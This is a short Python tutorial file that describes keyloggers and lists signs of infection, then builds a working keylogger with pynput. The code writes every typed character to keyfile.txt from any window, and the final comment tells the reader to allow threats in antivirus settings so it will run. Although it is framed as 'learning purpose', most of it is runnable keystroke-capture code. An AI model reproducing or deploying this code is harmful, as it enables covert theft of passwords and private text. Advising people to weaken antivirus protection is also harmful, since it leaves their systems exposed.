#A keylogger program is a program or a tool that is designed to secretly record the data that we type on a keyboard. Keylogger program is installed secretly on our system,
# It targets the system when the user is working on it and records the keystrokes in a text file, the keylogger sends the text files to the cyber criminal, the recorded data can be
# used by the hacker.

#Some indicators of a keylogger in your system
#1. Increased CPU usage, especially when you're not actively using the computer, may indicate the presence of a keylogger.
#2. If your system behaves unusually, such as slow performance, freezing, or crashing, it may be a sign of malicious activity.
#3. Some keyloggers may install additional toolbars or icons on your desktop without your knowledge.
#4. Keyloggers may be associated with adware or malicious software that generates unwanted pop-ups or ads.
#5. If you are using a laptop, an unexpected battery drain may be a sign of increased activity caused by a keylogger.
#6. Keyloggers may send the recorded data over the Internet. Monitoring network activity for unexpected or unexplained data transfers can be a clue.

#Let's create a keylogger together (Learning purpose)
#Let's first import pynput(it's a library ) which include keyboard module which can be used to capture key events from user)
#Make sure to install pynput first or else you are going to get an error (py -m pip install pynput or pip install pynput)

from pynput import keyboard 

#We are going to firrst create the function keyPressed which is going to take every key and append it to the keyfile.txt
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char= key.char
            logkey.write(char)
        except:
            print("Error getting char")


# Here it says that any time the key is pressed go pass that information to the keyPressed function.  
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()


# The codes are good to go, After running your program if you type on your keyboard somewhere (Either in the terminal, in a text file or in a browser) the keyfile.txt will be automatically be created recording every key you type on your keyboard.
#But first of all make sure to allow threats (Found in settings in Virus and Threats protection)
